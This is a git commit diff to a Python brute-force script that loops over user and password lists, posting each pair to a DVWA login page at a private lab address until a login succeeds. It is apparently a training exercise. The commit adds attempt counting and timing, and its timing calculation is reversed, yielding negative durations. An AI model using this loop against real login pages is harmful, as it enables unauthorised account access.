66df1d3bb9c29da0059a554489bf5b88d680f48f
Di Meo Giancarlo <80782176+Logica90@users.noreply.github.com>
2024-06-17 20:38:26 +0200

    update

--- Brute-Force/brute_force.py
+++ Brute-Force/brute_force.py
@@ -1,4 +1,6 @@
 import requests
+import time
+import os
 
 url = "http://192.168.50.101/dvwa/login.php"
 
@@ -14,7 +16,8 @@ credentials = {
     "Login":"Login"
 }
 
-i = 0
+n_attempt = 0
+start_time = time.time()
 
 stopit = False
 for user in user_list:
@@ -26,10 +29,16 @@ for user in user_list:
         credentials["username"] = user
         credentials["password"] = pwd  
         req = requests.post(url, data = credentials)
-        i+=1
-        print(f"Combinazione N: {i}")
+        n_attempt+=1
+        print(f"Combinazione N: {n_attempt}")
 
         if req.text.find("Login failed") == -1:
+            os.system("clear")
             print("Login success")
             print(f"{user} - {pwd}")
-            stopit = True   
+            stopit = True
+
+end_time = time.time()
+executio_time = round(start_time - end_time,2)
+print(f"Numero tentativi: {n_attempt}")
+print(f"Tempo di esecuzione: {executio_time} secondi")
